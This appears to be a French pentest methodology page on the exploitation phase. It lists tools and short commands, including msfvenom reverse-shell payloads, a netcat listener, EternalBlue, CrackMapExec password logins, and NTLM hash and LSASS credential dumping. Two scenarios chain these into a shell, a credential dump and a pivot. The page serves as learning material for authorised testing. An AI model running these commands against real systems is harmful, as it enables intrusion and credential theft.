
## 💥 Exploitation

---

## Introduction

La phase d’<span class="concept">exploitation</span> vise à transformer les informations collectées lors des phases précédentes (scanning + enumeration) en <span class="goal">accès initial</span> sur la cible.

Il ne s’agit pas seulement de « faire un exploit », mais de :
- Identifier un vecteur d’entrée
- Choisir un mode d’exploitation contrôlé
- Obtenir un shell, un compte, ou un accès aux données

L’exploit doit toujours être adapté au <span class="concept">contexte cible</span> (ex: prod vs CTF).

---

## Objectifs

- <span class="goal">Compromettre un système ou un service</span>
- <span class="goal">Obtenir un shell ou des credentials</span>
- <span class="goal">Maintenir la stabilité de la cible</span>

---

## Outils & commandes

| Outil | Exemple & explication |
|-------|-----------------------|
| <span class="technology">searchsploit</span> | <span class="example">searchsploit apache 2.4.49</span> → <span class="note">Recherche d’exploits connus (EDB)</span> |
| <span class="technology">exploit-db.com</span> | <span class="example">Recherche en ligne</span> |
| <span class="technology">Impacket / CrackMapExec</span> | <span class="example">cme smb target --shares</span> / <span class="example">impacket-psexec</span> |
| <span class="technology">Metasploit (msfconsole)</span> | <span class="example">use exploit/windows/smb/ms17_010_eternalblue</span> |
| <span class="technology">python3 / bash exploits</span> | <span class="example">python3 exploit.py target</span> |
| <span class="technology">nmap NSE vuln</span> | <span class="example">nmap --script vuln -p 80,443 target</span> |
| <span class="technology">Chisel / Ligolo</span> | <span class="example">Pivoting vers réseaux internes</span> |
| <span class="technology">Socat</span> | <span class="example">Reverse shell controlé</span> |
| <span class="technology">msfvenom</span> | <span class="example">msfvenom -p windows/meterpreter/reverse_tcp LHOST=... -f exe</span> |

---

## Vérifications avant exploitation

- <span class="best-practice">Valider le périmètre et les cibles autorisées</span>
- <span class="best-practice">Confirmer l’impact métier potentiel</span> (ex: prod vs test)
- <span class="best-practice">S’assurer de la stabilité de la cible (pas de DoS)</span>
- <span class="best-practice">Logger les exploits tentés et leur résultat</span>

---

## Techniques principales

| Vecteur | Exemple |
|---------|---------|
| <span class="concept">Web Exploit</span> | SQLi, XSS → RCE / LFI |
| <span class="concept">Réseau</span> | SMB exploit, SNMP exploit |
| <span class="concept">Local privilege exploit</span> | Kernel vuln, SUID abuse |
| <span class="concept">Credential reuse</span> | Compte AD compromis |
| <span class="concept">Password spraying / bruteforce</span> | Hydra / CrackMapExec |

---

## Bonnes pratiques

- <span class="best-practice">Toujours valider l’impact métier avant d’exploiter en prod</span>
- <span class="best-practice">Limiter les risques d’instabilité (DoS involontaire)</span>
- <span class="best-practice">Préférer un shell interactif stable</span>
- <span class="mitigation">Ne jamais exécuter un exploit destructif</span>

---

## 🎯 Exemple de scénario

> <span class="note">💥 Cible :</span> Web server Apache 2.4.49 vulnérable (path traversal)

Actions :
- <span class="technology">searchsploit apache 2.4.49</span> → exploit path traversal connu
- <span class="technology">python3 exploit.py target</span> → accès /etc/passwd en lecture
- <span class="technology">msfvenom</span> → reverse shell PHP généré
- <span class="technology">nc -lvnp 4444</span> → réception du shell
- <span class="technology">Chisel</span> → pivot vers un serveur DB en interne


---

## 🎯 Exemple complémentaire (SMB / AD)

> <span class="note">💥 Cible :</span> Contrôleur de domaine exposant SMB / RPC

Actions :
- <span class="technology">cme smb target --shares</span> → énumération des partages
- <span class="technology">cme smb target -u admin -p 'Summer2024!'</span> → test login et accès distant
- <span class="technology">impacket-secretsdump -target</span> → extraction de hashes NTLM
- <span class="technology">lsassy</span> → dump de credentials sur hôte Windows
- <span class="technology">impacket-psexec</span> → exécution de commande à distance


---

## Liens vers escalation

- Shell → <span class="goal">Enumération pour escalade (priv esc)</span>
- Dump creds → <span class="goal">Mouvement latéral (lateral movement)</span>
- Web exploit → RCE → pivoting possible
- SMB exploit → accès AD


---

## Exploitation offline

- <span class="best-practice">Certains pentests pros n’autorisent pas d’accès Internet depuis la cible</span>
- Prévoir des <span class="technology">payloads offline</span> (reverse shell restreint, msfvenom en local)
- Utiliser un <span class="technology">pivot</span> pour acheminer les flux (Chisel, socks4 proxychains)


---

## Cheatlist outils par vecteur

| Vecteur | Outils clés |
|---------|------------|
| Web Exploit | searchsploit, exploit-db, Metasploit, python exploit |
| Réseau (SMB, RDP) | CrackMapExec, Impacket, Metasploit |
| AD Internal | CrackMapExec, Impacket, BloodHound |
| Local kernel / SUID | LinPEAS, winPEAS, searchsploit |
| Pivot | Chisel, Ligolo, Proxychains |
| Reverse shell | msfvenom, socat, nc |

---

## 🚀 Navigation

- 🚀 [[06_Privilege_Escalation]]
- 🚀 [[07_Post_Exploitation]]
